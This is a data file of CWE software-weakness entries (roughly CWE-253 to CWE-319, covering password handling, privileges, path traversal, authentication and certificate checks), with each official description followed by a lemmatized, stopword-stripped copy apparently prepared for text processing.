CWE-253,Incorrect Check of Function Return Value,"The product incorrectly checks a return value from a function, which prevents it from detecting errors or exceptional conditions.Important and common functions will return some value about the success of its actions. This will alert the program whether or not to handle any errors caused by that function.",product incorrectly check return value function prevent detect error exceptional condition important common function return value success action alert program handle error cause function
CWE-256,Plaintext Storage of a Password,"Storing a password in plaintext may result in a system compromise.Password management issues occur when a password is stored in plaintext in an application's properties, configuration file, or memory. Storing a plaintext password in a configuration file allows anyone who can read the file access to the password-protected resource. In some contexts, even storage of a plaintext password in memory is considered a security risk if the password is not cleared immediately after it is used.",store password plaintext result system compromise password management issue occur password store plaintext application property configuration file memory store plaintext password configuration file allow read file access password protect resource context storage plaintext password memory consider security risk password clear immediately
CWE-257,Storing Passwords in a Recoverable Format,"The storage of passwords in a recoverable format makes them subject to password reuse attacks by malicious users. In fact, it should be noted that recoverable encrypted passwords provide no significant benefit over plaintext passwords since they are subject not only to reuse by malicious attackers but also by malicious insiders. If a system administrator can recover a password directly, or use a brute force search on the available information, the administrator can use the password on other accounts.",storage password recoverable format make subject password reuse attack malicious user fact note recoverable encrypt password provide significant benefit plaintext password subject reuse malicious attacker malicious insider system administrator recover password directly use brute force search available information administrator use password account
CWE-258,Empty Password in Configuration File,Using an empty string as a password is insecure.,string password insecure
CWE-259,Use of Hard-coded Password,"The product contains a hard-coded password, which it uses for its own inbound authentication or for outbound communication to external components.A hard-coded password typically leads to a significant authentication failure that can be difficult for the system administrator to detect. Once detected, it can be difficult to fix, so the administrator may be forced into disabling the product entirely. There are two main variations:Inbound: the product contains an authentication mechanism that checks for a hard-coded password.Outbound: the product connects to another system or component, and it contains hard-coded password for connecting to that component.In the Inbound variant, a default administration account is created, and a simple password is hard-coded into the product and associated with that account. This hard-coded password is the same for each installation of the product, and it usually cannot be changed or disabled by system administrators without manually modifying the program, or otherwise patching the product. If the password is ever discovered or published (a common occurrence on the Internet), then anybody with knowledge of this password can access the product. Finally, since all installations of the product will have the same password, even across different organizations, this enables massive attacks such as worms to take place.The Outbound variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password which can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end product. Any user of that program may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat, since the extraction of a password from a binary is usually very simple.",product contain hard code password use inbound authentication outbound communication external component hard code password typically lead significant authentication failure difficult system administrator detect detect difficult fix administrator force disable product entirely main variation inbound product contain authentication mechanism check hard code password outbound product connect system component contain hard code password connect component inbound variant default administration account create simple password hard code product associate account hard code password installation product usually change disable system administrator manually modify program patch product password discover publish common occurrence internet anybody knowledge password access product finally installation product password different organization enable massive attack worm place outbound variant apply end system authenticate end service end service require fix password easily discover programmer simply hard code end credential end product user program able extract password client system hard code password pose threat extraction password binary usually simple
CWE-26,Path Traversal: '/dir/../filename',"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize ""/dir/../filename"" sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.The '/dir/../filename' manipulation is useful for bypassing some path traversal protection schemes. Sometimes a program only checks for ""../"" at the beginning of the input, so a ""/../"" can bypass that check.",product use external input construct pathname restricted directory properly neutralize sequence resolve location outside directory allow attacker traverse file system access file directory outside restricted directory manipulation useful bypass path traversal protection scheme program check beginning input bypass check
CWE-260,Password in Configuration File,"The product stores a password in a configuration file that might be accessible to actors who do not know the password.This can result in compromise of the system for which the password is used. An attacker could gain access to this file and learn the stored password or worse yet, change the password to one of their choosing.",product store password configuration file accessible actor know password result compromise system password attacker gain access file learn store password worse change password choosing
CWE-261,Weak Encoding for Password,"Obscuring a password with a trivial encoding does not protect the password.Password management issues occur when a password is stored in plaintext in an application's properties or configuration file. A programmer can attempt to remedy the password management problem by obscuring the password with an encoding function, such as base 64 encoding, but this effort does not adequately protect the password.",obscure password trivial encoding protect password password management issue occur password store plaintext application property configuration file programmer attempt remedy password management problem obscure password encoding function base encoding effort adequately protect password
CWE-262,Not Using Password Aging,"The product does not have a mechanism in place for managing password aging.Password aging (or password rotation) is a policy that forces users to change their passwords after a defined time period passes, such as every 30 or 90 days. Without mechanisms such as aging, users might not change their passwords in a timely manner.Note that while password aging was once considered an important security feature, it has since fallen out of favor by many, because it is not as effective against modern threats compared to other mechanisms such as slow hashes. In addition, forcing frequent changes can unintentionally encourage users to select less-secure passwords. However, password aging is still in use due to factors such as compliance requirements, e.g., Payment Card Industry Data Security Standard (PCI DSS).",product mechanism place manage password aging password aging password rotation policy force user change password define time period pass day mechanism aging user change password timely manner note password aging consider important security feature fall favor effective modern threat compare mechanism slow hash addition force frequent change unintentionally encourage user select secure password password aging use factor compliance requirement payment card industry data security standard pci dss
CWE-263,Password Aging with Long Expiration,"The product supports password aging, but the expiration period is too long.Password aging (or password rotation) is a policy that forces users to change their passwords after a defined time period passes, such as every 30 or 90 days. A long expiration provides more time for attackers to conduct password cracking before users are forced to change to a new password.Note that while password aging was once considered an important security feature, it has since fallen out of favor by many, because it is not as effective against modern threats compared to other mechanisms such as slow hashes. In addition, forcing frequent changes can unintentionally encourage users to select less-secure passwords. However, password aging is still in use due to factors such as compliance requirements, e.g., Payment Card Industry Data Security Standard (PCI DSS).",product support password aging expiration period long password aging password rotation policy force user change password define time period pass day long expiration provide time attacker conduct password cracking user force change new password note password aging consider important security feature fall favor effective modern threat compare mechanism slow hash addition force frequent change unintentionally encourage user select secure password password aging use factor compliance requirement payment card industry data security standard pci dss
CWE-266,Incorrect Privilege Assignment,"A product incorrectly assigns a privilege to a particular actor, creating an unintended sphere of control for that actor.",product incorrectly assign privilege particular actor create unintended sphere control actor
CWE-267,Privilege Defined With Unsafe Actions,"A particular privilege, role, capability, or right can be used to perform unsafe actions that were not intended, even when it is assigned to the correct entity.",particular privilege role capability right perform unsafe action intend assign correct entity
CWE-268,Privilege Chaining,"Two distinct privileges, roles, capabilities, or rights can be combined in a way that allows an entity to perform unsafe actions that would not be allowed without that combination.",distinct privilege role capability right combine way allow entity perform unsafe action allow combination
CWE-269,Improper Privilege Management,"The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor.",product properly assign modify track check privilege actor create unintended sphere control actor
CWE-27,Path Traversal: 'dir/../../filename',"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize multiple internal ""../"" sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.The 'directory/../../filename' manipulation is useful for bypassing some path traversal protection schemes. Sometimes a program only removes one ""../"" sequence, so multiple ""../"" can bypass that check. Alternately, this manipulation could be used to bypass a check for ""../"" at the beginning of the pathname, moving up more than one directory level.",product use external input construct pathname restricted directory properly neutralize multiple internal sequence resolve location outside directory allow attacker traverse file system access file directory outside restricted directory manipulation useful bypass path traversal protection scheme program remove sequence multiple bypass check alternately manipulation bypass check beginning pathname move directory level
CWE-270,Privilege Context Switching Error,The product does not properly manage privileges while it is switching between different contexts that have different privileges or spheres of control.,product properly manage privilege switch different context different privilege sphere control
CWE-271,Privilege Dropping / Lowering Errors,"The product does not drop privileges before passing control of a resource to an actor that does not have those privileges.In some contexts, a system executing with elevated permissions will hand off a process/file/etc. to another process or user. If the privileges of an entity are not reduced, then elevated privileges are spread throughout a system and possibly to an attacker.",product drop privilege pass control resource actor privilege context system execute elevated permission hand process file etc process user privilege entity reduce elevated privilege spread system possibly attacker
CWE-272,Least Privilege Violation,The elevated privilege level required to perform operations such as chroot() should be dropped immediately after the operation is performed.,elevated privilege level require perform operation chroot drop immediately operation perform
CWE-273,Improper Check for Dropped Privileges,"The product attempts to drop privileges but does not check or incorrectly checks to see if the drop succeeded.If the drop fails, the product will continue to run with the raised privileges, which might provide additional access to unprivileged users.",product attempt drop privilege check incorrectly check drop succeed drop fail product continue run raise privilege provide additional access unprivileged user
CWE-274,Improper Handling of Insufficient Privileges,"The product does not handle or incorrectly handles when it has insufficient privileges to perform an operation, leading to resultant weaknesses.",product handle incorrectly handle insufficient privilege perform operation lead resultant weakness
CWE-276,Incorrect Default Permissions,"During installation, installed file permissions are set to allow anyone to modify those files.",installation instal file permission set allow modify file
CWE-277,Insecure Inherited Permissions,A product defines a set of insecure permissions that are inherited by objects that are created by the program.,product define set insecure permission inherit object create program
CWE-278,Insecure Preserved Inherited Permissions,"A product inherits a set of insecure permissions for an object, e.g. when copying from an archive file, without user awareness or involvement.",product inherit set insecure permission object copy archive file user awareness involvement
CWE-279,Incorrect Execution-Assigned Permissions,"While it is executing, the product sets the permissions of an object in a way that violates the intended permissions that have been specified by the user.",execute product set permission object way violate intend permission specify user
CWE-28,Path Traversal: '..\filedir',"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize ""..\"" sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.The '..\' manipulation is the canonical manipulation for operating systems that use ""\"" as directory separators, such as Windows. However, it is also useful for bypassing path traversal protection schemes that only assume that the ""/"" separator is valid.",product use external input construct pathname restricted directory properly neutralize sequence resolve location outside directory allow attacker traverse file system access file directory outside restricted directory manipulation canonical manipulation operate system use directory separator windows useful bypass path traversal protection scheme assume separator valid
CWE-280,Improper Handling of Insufficient Permissions or Privileges ,The product does not handle or incorrectly handles when it has insufficient privileges to access resources or functionality as specified by their permissions. This may cause it to follow unexpected code paths that may leave the product in an invalid state.,product handle incorrectly handle insufficient privilege access resource functionality specify permission cause follow unexpected code path leave product invalid state
CWE-281,Improper Preservation of Permissions,"The product does not preserve permissions or incorrectly preserves permissions when copying, restoring, or sharing objects, which can cause them to have less restrictive permissions than intended.",product preserve permission incorrectly preserve permission copy restore share object cause restrictive permission intend
CWE-282,Improper Ownership Management,"The product assigns the wrong ownership, or does not properly verify the ownership, of an object or resource.",product assign wrong ownership properly verify ownership object resource
CWE-283,Unverified Ownership,The product does not properly verify that a critical resource is owned by the proper entity.,product properly verify critical resource own proper entity
CWE-284,Improper Access Control,"The product does not restrict or incorrectly restricts access to a resource from an unauthorized actor.Access control involves the use of several protection mechanisms such as:Authentication (proving the identity of an actor)Authorization (ensuring that a given actor can access a resource), andAccountability (tracking of activities that were performed)When any mechanism is not applied or otherwise fails, attackers can compromise the security of the product by gaining privileges, reading sensitive information, executing commands, evading detection, etc.There are two distinct behaviors that can introduce access control weaknesses:Specification: incorrect privileges, permissions, ownership, etc. are explicitly specified for either the user or the resource (for example, setting a password file to be world-writable, or giving administrator capabilities to a guest user). This action could be performed by the program or the administrator.Enforcement: the mechanism contains errors that prevent it from properly enforcing the specified access control requirements (e.g., allowing the user to specify their own privileges, or allowing a syntactically-incorrect ACL to produce insecure settings). This problem occurs within the program itself, in that it does not actually enforce the intended security policy that the administrator specifies.",product restrict incorrectly restrict access resource unauthorized actor access control involve use protection mechanism authentication prove identity ensure give actor access resource andaccountability tracking activity mechanism apply fail attacker compromise security product gain privilege read sensitive information execute command evade detection etc distinct behavior introduce access control weakness specification incorrect privilege permission ownership etc explicitly specify user resource example set password file world writable give administrator capability guest user action perform program administrator enforcement mechanism contain error prevent properly enforce specify access control requirement allow user specify privilege allow syntactically incorrect acl produce insecure setting problem occur program actually enforce intended security policy administrator specify
CWE-285,Improper Authorization,"The product does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action.Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.When access control checks are not applied consistently - or not at all - users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.",product perform incorrectly perform authorization check actor attempt access resource perform action assume user give identity authorization process determine user access give resource base user privilege permission access control specification apply resource access control check apply consistently user able access datum perform action allow perform lead wide range problem include information exposure denial service arbitrary code execution
CWE-286,Incorrect User Management,The product does not properly manage a user within its environment.Users can be assigned to the wrong group (class) of permissions resulting in unintended access rights to sensitive objects.,product properly manage user environment user assign wrong group class permission result unintended access right sensitive object
CWE-287,Improper Authentication,"When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct.",actor claim give identity product prove insufficiently prove claim correct
CWE-288,Authentication Bypass Using an Alternate Path or Channel,"A product requires authentication, but the product has an alternate path or channel that does not require authentication.",product require authentication product alternate path channel require authentication
CWE-289,Authentication Bypass by Alternate Name,"The product performs authentication based on the name of a resource being accessed, or the name of the actor performing the access, but it does not properly check all possible names for that resource or actor.",product perform authentication base resource access actor perform access properly check possible name resource actor
CWE-29,Path Traversal: '\..\filename',"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '\..\filename' (leading backslash dot dot) sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.This is similar to CWE-25, except using ""\"" instead of ""/"". Sometimes a program checks for ""..\"" at the beginning of the input, so a ""\..\"" can bypass that check. It is also useful for bypassing path traversal protection schemes that only assume that the ""/"" separator is valid.",product use external input construct pathname restricted directory properly neutralize lead backslash dot dot sequence resolve location outside directory allow attacker traverse file system access file directory outside restricted directory similar instead program check beginning input bypass check useful bypass path traversal protection scheme assume separator valid
CWE-290,Authentication Bypass by Spoofing,This attack-focused weakness is caused by incorrectly implemented authentication schemes that are subject to spoofing attacks.,attack focus weakness cause incorrectly implement authentication scheme subject spoofing attack
CWE-291,Reliance on IP Address for Authentication,"The product uses an IP address for authentication.IP addresses can be easily spoofed. Attackers can forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication.",product use ip address authentication ip address easily spoof attacker forge source ip address packet send response packet return forge ip address response packet attacker sniff traffic victim machine forge ip address order accomplish require sniffing attacker typically attempt locate subnet victim machine attacker able circumvent requirement source routing source routing disable internet today summary ip address verification useful authentication scheme single factor require authentication
CWE-292,DEPRECATED: Trusting Self-reported DNS Name,This entry has been deprecated because it was a duplicate of CWE-350. All content has been transferred to CWE-350.,entry deprecate duplicate content transfer
CWE-293,Using Referer Field for Authentication,"The referer field in HTTP requests can be easily modified and, as such, is not a valid means of message integrity checking.",referer field http request easily modify valid means message integrity checking
CWE-294,Authentication Bypass by Capture-replay,"A capture-replay flaw exists when the design of the product makes it possible for a malicious user to sniff network traffic and bypass authentication by replaying it to the server in question to the same effect as the original message (or with minor changes).Capture-replay attacks are common and can be difficult to defeat without cryptography. They are a subset of network injection attacks that rely on observing previously-sent valid commands, then changing them slightly if necessary and resending the same commands to the server.",capture replay flaw exist design product make possible malicious user sniff network traffic bypass authentication replay server question effect original message minor replay attack common difficult defeat cryptography subset network injection attack rely observe previously send valid command change slightly necessary resende command server
CWE-295,Improper Certificate Validation,"The product does not validate, or incorrectly validates, a certificate.When a certificate is invalid or malicious, it might allow an attacker to spoof a trusted entity by interfering in the communication path between the host and client. The product might connect to a malicious host while believing it is a trusted host, or the product might be deceived into accepting spoofed data that appears to originate from a trusted host.",product validate incorrectly validate certificate certificate invalid malicious allow attacker spoof trusted entity interfere communication path host client product connect malicious host believe trust host product deceive accept spoofed data appear originate trusted host
CWE-296,Improper Following of a Certificate's Chain of Trust,"The product does not follow, or incorrectly follows, the chain of trust for a certificate back to a trusted root certificate, resulting in incorrect trust of any resource that is associated with that certificate.If a system does not follow the chain of trust of a certificate to a root server, the certificate loses all usefulness as a metric of trust. Essentially, the trust gained from a certificate is derived from a chain of trust -- with a reputable trusted entity at the end of that list. The end user must trust that reputable source, and this reputable source must vouch for the resource in question through the medium of the certificate.In some cases, this trust traverses several entities who vouch for one another. The entity trusted by the end user is at one end of this trust chain, while the certificate-wielding resource is at the other end of the chain. If the user receives a certificate at the end of one of these trust chains and then proceeds to check only that the first link in the chain, no real trust has been derived, since the entire chain must be traversed back to a trusted source to verify the certificate.There are several ways in which the chain of trust might be broken, including but not limited to:Any certificate in the chain is self-signed, unless it the root.Not every intermediate certificate is checked, starting from the original certificate all the way up to the root certificate.An intermediate, CA-signed certificate does not have the expected Basic Constraints or other important extensions.The root certificate has been compromised or authorized to the wrong party.",product follow incorrectly follow chain trust certificate trust root certificate result incorrect trust resource associate certificate system follow chain trust certificate root server certificate lose usefulness metric trust essentially trust gain certificate derive chain trust reputable trust entity end list end user trust reputable source reputable source vouch resource question medium certificate case trust traverse entity vouch entity trust end user end trust chain certificate wield resource end chain user receive certificate end trust chain proceed check link chain real trust derive entire chain traverse trust source verify certificate way chain trust break include limit certificate chain self sign root intermediate certificate check start original certificate way root certificate intermediate sign certificate expect basic constraints important extension root certificate compromise authorize wrong party
CWE-297,Improper Validation of Certificate with Host Mismatch,"The product communicates with a host that provides a certificate, but the product does not properly ensure that the certificate is actually associated with that host.Even if a certificate is well-formed, signed, and follows the chain of trust, it may simply be a valid certificate for a different site than the site that the product is interacting with. If the certificate's host-specific data is not properly checked - such as the Common Name (CN) in the Subject or the Subject Alternative Name (SAN) extension of an X.509 certificate - it may be possible for a redirection or spoofing attack to allow a malicious host with a valid certificate to provide data, impersonating a trusted host. In order to ensure data integrity, the certificate must be valid and it must pertain to the site that is being accessed.Even if the product attempts to check the hostname, it is still possible to incorrectly check the hostname. For example, attackers could create a certificate with a name that begins with a trusted name followed by a NUL byte, which could cause some string-based comparisons to only examine the portion that contains the trusted name.This weakness can occur even when the product uses Certificate Pinning, if the product does not verify the hostname at the time a certificate is pinned.",product communicate host provide certificate product properly ensure certificate actually associate host certificate form sign follow chain trust simply valid certificate different site site product interact certificate host specific datum properly check common cn subject subject alternative san extension certificate possible redirection spoofing attack allow malicious host valid certificate provide datum impersonate trust host order ensure data integrity certificate valid pertain site access product attempt check hostname possible incorrectly check hostname example attacker create certificate begin trust follow nul byte cause string base comparison examine portion contain trust weakness occur product use certificate pinning product verify hostname time certificate pin
CWE-298,Improper Validation of Certificate Expiration,"A certificate expiration is not validated or is incorrectly validated, so trust may be assigned to certificates that have been abandoned due to age.When the expiration of a certificate is not taken into account, no trust has necessarily been conveyed through it. Therefore, the validity of the certificate cannot be verified and all benefit of the certificate is lost.",certificate expiration validate incorrectly validate trust assign certificate abandon age expiration certificate take account trust necessarily convey validity certificate verify benefit certificate lose
CWE-299,Improper Check for Certificate Revocation,"The product does not check or incorrectly checks the revocation status of a certificate, which may cause it to use a certificate that has been compromised.An improper check for certificate revocation is a far more serious flaw than related certificate failures. This is because the use of any revoked certificate is almost certainly malicious. The most common reason for certificate revocation is compromise of the system in question, with the result that no legitimate servers will be using a revoked certificate, unless they are sorely out of sync.",product check incorrectly check revocation status certificate cause use certificate compromise improper check certificate revocation far flaw related certificate failure use revoke certificate certainly malicious common reason certificate revocation compromise system question result legitimate server revoke certificate sorely sync
CWE-30,Path Traversal: '\dir\..\filename',"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '\dir\..\filename' (leading backslash dot dot) sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.This is similar to CWE-26, except using ""\"" instead of ""/"". The '\dir\..\filename' manipulation is useful for bypassing some path traversal protection schemes. Sometimes a program only checks for ""..\"" at the beginning of the input, so a ""\..\"" can bypass that check.",product use external input construct pathname restricted directory properly neutralize lead backslash dot dot sequence resolve location outside directory allow attacker traverse file system access file directory outside restricted directory similar instead manipulation useful bypass path traversal protection scheme program check beginning input bypass check
CWE-300,Channel Accessible by Non-Endpoint,"The product does not adequately verify the identity of actors at both ends of a communication channel, or does not adequately ensure the integrity of the channel, in a way that allows the channel to be accessed or influenced by an actor that is not an endpoint.In order to establish secure communication between two parties, it is often important to adequately verify the identity of entities at each end of the communication channel. Inadequate or inconsistent verification may result in insufficient or incorrect identification of either communicating entity. This can have negative consequences such as misplaced trust in the entity at the other end of the channel. An attacker can leverage this by interposing between the communicating entities and masquerading as the original entity. In the absence of sufficient verification of identity, such an attacker can eavesdrop and potentially modify the communication between the original entities.",product adequately verify identity actor end communication channel adequately ensure integrity channel way allow channel access influence actor endpoint order establish secure communication party important adequately verify identity entity end communication channel inadequate inconsistent verification result insufficient incorrect identification communicate entity negative consequence misplaced trust entity end channel attacker leverage interpose communicate entity masquerade original entity absence sufficient verification identity attacker eavesdrop potentially modify communication original entity
CWE-301,Reflection Attack in an Authentication Protocol,"Simple authentication protocols are subject to reflection attacks if a malicious user can use the target machine to impersonate a trusted user.A mutual authentication protocol requires each party to respond to a random challenge by the other party by encrypting it with a pre-shared key. Often, however, such protocols employ the same pre-shared key for communication with a number of different entities. A malicious user or an attacker can easily compromise this protocol without possessing the correct key by employing a reflection attack on the protocol.Reflection attacks capitalize on mutual authentication schemes in order to trick the target into revealing the secret shared between it and another valid user. In a basic mutual-authentication scheme, a secret is known to both the valid user and the server; this allows them to authenticate. In order that they may verify this shared secret without sending it plainly over the wire, they utilize a Diffie-Hellman-style scheme in which they each pick a value, then request the hash of that value as keyed by the shared secret. In a reflection attack, the attacker claims to be a valid user and requests the hash of a random value from the server. When the server returns this value and requests its own value to be hashed, the attacker opens another connection to the server. This time, the hash requested by the attacker is the value which the server requested in the first connection. When the server returns this hashed value, it is used in the first connection, authenticating the attacker successfully as the impersonated valid user.",simple authentication protocol subject reflection attack malicious user use target machine impersonate trust user mutual authentication protocol require party respond random challenge party encrypt pre shared key protocol employ pre shared key communication number different entity malicious user attacker easily compromise protocol possess correct key employ reflection attack protocol reflection attack capitalize mutual authentication scheme order trick target reveal secret share valid user basic mutual authentication scheme secret know valid user server allow authenticate order verify share secret send plainly wire utilize diffie hellman style scheme pick value request hash value key share secret reflection attack attacker claim valid user request hash random value server server return value request value hash attacker open connection server time hash request attacker value server request connection server return hash value connection authenticate attacker successfully impersonate valid user
CWE-302,Authentication Bypass by Assumed-Immutable Data,"The authentication scheme or implementation uses key data elements that are assumed to be immutable, but can be controlled or modified by the attacker.",authentication scheme implementation use key datum element assume immutable control modify attacker
CWE-303,Incorrect Implementation of Authentication Algorithm,"The requirements for the product dictate the use of an established authentication algorithm, but the implementation of the algorithm is incorrect.This incorrect implementation may allow authentication to be bypassed.",requirement product dictate use establish authentication algorithm implementation algorithm incorrect incorrect implementation allow authentication bypass
CWE-304,Missing Critical Step in Authentication,"The product implements an authentication technique, but it skips a step that weakens the technique.Authentication techniques should follow the algorithms that define them exactly, otherwise authentication can be bypassed or more easily subjected to brute force attacks.",product implement authentication technique skip step weaken technique authentication technique follow algorithm define exactly authentication bypass easily subject brute force attack
CWE-305,Authentication Bypass by Primary Weakness,"The authentication algorithm is sound, but the implemented mechanism can be bypassed as the result of a separate weakness that is primary to the authentication error.",authentication algorithm sound implement mechanism bypass result separate weakness primary authentication error
CWE-306,Missing Authentication for Critical Function,"The product does not perform any authentication for functionality that requires a provable user identity or consumes a significant amount of resources.As data is migrated to the cloud, if access does not require authentication, it can be easier for attackers to access the data from anywhere on the Internet.",product perform authentication functionality require provable user identity consume significant resource data migrate cloud access require authentication easy attacker access datum internet
CWE-307,Improper Restriction of Excessive Authentication Attempts,"The product does not implement sufficient measures to prevent multiple failed authentication attempts within a short time frame, making it more susceptible to brute force attacks.",product implement sufficient measure prevent multiple fail authentication attempt short time frame make susceptible brute force attack
CWE-308,Use of Single-factor Authentication,"The use of single-factor authentication can lead to unnecessary risk of compromise when compared with the benefits of a dual-factor authentication scheme.While the use of multiple authentication schemes is simply piling on more complexity on top of authentication, it is inestimably valuable to have such measures of redundancy. The use of weak, reused, and common passwords is rampant on the internet. Without the added protection of multiple authentication schemes, a single mistake can result in the compromise of an account. For this reason, if multiple schemes are possible and also easy to use, they should be implemented and required.",use single factor authentication lead unnecessary risk compromise compare benefit dual factor authentication scheme use multiple authentication scheme simply pile complexity authentication inestimably valuable measure redundancy use weak reuse common password rampant internet add protection multiple authentication scheme single mistake result compromise account reason multiple scheme possible easy use implement require
CWE-309,Use of Password System for Primary Authentication,"The use of password systems as the primary means of authentication may be subject to several flaws or shortcomings, each reducing the effectiveness of the mechanism.",use password system primary means authentication subject flaw shortcoming reduce effectiveness mechanism
CWE-31,Path Traversal: 'dir\..\..\filename',"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize 'dir\..\..\filename' (multiple internal backslash dot dot) sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.The 'dir\..\..\filename' manipulation is useful for bypassing some path traversal protection schemes. Sometimes a program only removes one ""..\"" sequence, so multiple ""..\"" can bypass that check. Alternately, this manipulation could be used to bypass a check for ""..\"" at the beginning of the pathname, moving up more than one directory level.",product use external input construct pathname restricted directory properly neutralize multiple internal backslash dot dot sequence resolve location outside directory allow attacker traverse file system access file directory outside restricted directory manipulation useful bypass path traversal protection scheme program remove sequence multiple bypass check alternately manipulation bypass check beginning pathname move directory level
CWE-311,Missing Encryption of Sensitive Data,"The product does not encrypt sensitive or critical information before storage or transmission.The lack of proper data encryption passes up the guarantees of confidentiality, integrity, and accountability that properly implemented encryption conveys.",product encrypt sensitive critical information storage transmission lack proper datum encryption pass guarantee confidentiality integrity accountability properly implement encryption convey
CWE-312,Cleartext Storage of Sensitive Information,"The product stores sensitive information in cleartext within a resource that might be accessible to another control sphere.Because the information is stored in cleartext (i.e., unencrypted), attackers could potentially read it. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.When organizations adopt cloud services, it can be easier for attackers to access the data from anywhere on the Internet.In some systems/environments such as cloud, the use of ""double encryption"" (at both the software and hardware layer) might be required, and the developer might be solely responsible for both layers, instead of shared responsibility with the administrator of the broader system/environment.",product store sensitive information cleartext resource accessible control sphere information store cleartext unencrypted attacker potentially read information encode way human readable certain technique determine encoding decode information organization adopt cloud service easy attacker access datum internet system environment cloud use double encryption software hardware layer require developer solely responsible layer instead share responsibility administrator broad system environment
CWE-313,Cleartext Storage in a File or on Disk,"The product stores sensitive information in cleartext in a file, or on disk.The sensitive information could be read by attackers with access to the file, or with physical or administrator access to the raw disk. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.",product store sensitive information cleartext file disk sensitive information read attacker access file physical administrator access raw disk information encode way human readable certain technique determine encoding decode information
CWE-314,Cleartext Storage in the Registry,"The product stores sensitive information in cleartext in the registry.Attackers can read the information by accessing the registry key. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.",product store sensitive information cleartext registry attacker read information access registry key information encode way human readable certain technique determine encoding decode information
CWE-315,Cleartext Storage of Sensitive Information in a Cookie,"The product stores sensitive information in cleartext in a cookie.Attackers can use widely-available tools to view the cookie and read the sensitive information. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.",product store sensitive information cleartext cookie attacker use widely available tool view cookie read sensitive information information encode way human readable certain technique determine encoding decode information
CWE-316,Cleartext Storage of Sensitive Information in Memory,"The product stores sensitive information in cleartext in memory.The sensitive memory might be saved to disk, stored in a core dump, or remain uncleared if the product crashes, or if the programmer does not properly clear the memory before freeing it.It could be argued that such problems are usually only exploitable by those with administrator privileges. However, swapping could cause the memory to be written to disk and leave it accessible to physical attack afterwards. Core dump files might have insecure permissions or be stored in archive files that are accessible to untrusted people. Or, uncleared sensitive memory might be inadvertently exposed to attackers due to another weakness.",product store sensitive information cleartext memory sensitive memory save disk store core dump remain uncleared product crash programmer properly clear memory free argue problem usually exploitable administrator privilege swapping cause memory write disk leave accessible physical attack core dump file insecure permission store archive file accessible untrusted people uncleared sensitive memory inadvertently expose attacker weakness
CWE-317,Cleartext Storage of Sensitive Information in GUI,"The product stores sensitive information in cleartext within the GUI.An attacker can often obtain data from a GUI, even if hidden, by using an API to directly access GUI objects such as windows and menus. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.",product store sensitive information cleartext attacker obtain datum gui hide api directly access gui object window menu information encode way human readable certain technique determine encoding decode information
CWE-318,Cleartext Storage of Sensitive Information in Executable,"The product stores sensitive information in cleartext in an executable.Attackers can reverse engineer binary code to obtain secret data. This is especially easy when the cleartext is plain ASCII. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.",product store sensitive information cleartext executable attacker reverse engineer binary code obtain secret datum especially easy cleartext plain ascii information encode way human readable certain technique determine encoding decode information
CWE-319,Cleartext Transmission of Sensitive Information,"The product transmits sensitive or security-critical data in cleartext in a communication channel that can be sniffed by unauthorized actors.Many communication channels can be ""sniffed"" (monitored) by adversaries during data transmission. For example, in networking, packets can traverse many intermediary nodes from the source to the destination, whether across the internet, an internal network, the cloud, etc. Some actors might have privileged access to a network interface or any link along the channel, such as a router, but they might not be authorized to collect the underlying data. As a result, network traffic could be sniffed by adversaries, spilling security-critical data.Applicable communication channels are not limited to software products. Applicable channels include hardware-specific technologies such as internal hardware networks and external debug channels, supporting remote JTAG debugging. When mitigations are not applied to combat adversaries within the product's threat model, this weakness significantly lowers the difficulty of exploitation by such adversaries.When full communications are recorded or logged, such as with a packet dump, an adversary could attempt to obtain the dump long after the transmission has occurred and try to ""sniff"" the cleartext from the recorded communications in the dump itself. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.",product transmit sensitive security critical datum cleartext communication channel sniff unauthorized actor communication channel sniff monitor adversary data transmission example networking packet traverse intermediary node source destination internet internal network cloud etc actor privileged access network interface link channel router authorize collect underlie datum result network traffic sniff adversary spill security critical datum applicable communication channel limit software product applicable channel include hardware specific technology internal hardware network external debug channel support remote jtag debugging mitigation apply combat adversary product threat model weakness significantly lower difficulty exploitation adversary communication record log packet dump adversary attempt obtain dump long transmission occur try sniff cleartext record communication dump information encode way human readable certain technique determine encoding decode information
